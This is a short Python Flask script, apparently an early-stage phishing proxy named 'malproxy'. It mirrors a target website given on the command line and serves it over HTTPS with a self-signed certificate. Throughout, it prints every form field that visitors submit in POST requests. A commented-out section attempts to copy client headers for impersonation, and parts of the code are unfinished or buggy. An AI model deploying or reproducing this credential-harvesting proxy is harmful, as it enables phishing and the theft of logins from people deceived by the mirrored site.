from flask import Flask, request, Response
from urllib.parse import urlparse
import requests
import sys

app = Flask('main', static_folder=None)
WEBSITE = 'example.com'


@app.route('/', defaults={'path': ''}, methods=['POST', 'GET'])
def malproxy(path):
    # TODO
    global WEBSITE
    parsed = urlparse(WEBSITE)
    if(not parsed.scheme):
        WEBSITE = f'https://{WEBSITE}'
    if(request.method == 'POST'):
        print(request.form)
        for pair in request.form:
            print(f'{pair[0]}: {pair[1]}')
    r = requests.request(request.method, f'{WEBSITE}{path}')
    return r.content

@app.route('/<path:path>', methods=['POST', 'GET'])
def proxycont(path):
    ## Attempting to impersonate client, perhaps continue trying
    # headers = {}
    # for pair in request.headers:
    #     headers[pair[0]] = pair[1]
    # headers['Referer'] = f'{WEBSITE}'
    # headers['Host'] = f'{WEBSITE}'
    # print(f'{WEBSITE}/{path}')

    s = requests.Session()
    s.headers.update({'User-Agent':request.headers.get('User-Agent')})
    if(request.method == 'POST'):
        print(request.form)
        for key in request.form:
            print(f'{key}: {request.form[key]}')
    r = requests.request(request.method, f'{WEBSITE}/{path}')
    return r.content

    

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print('ERROR: Website not provided.')
        exit(1)

    WEBSITE = sys.argv[1]
    app.run(host='0.0.0.0', port=8080, ssl_context='adhoc')


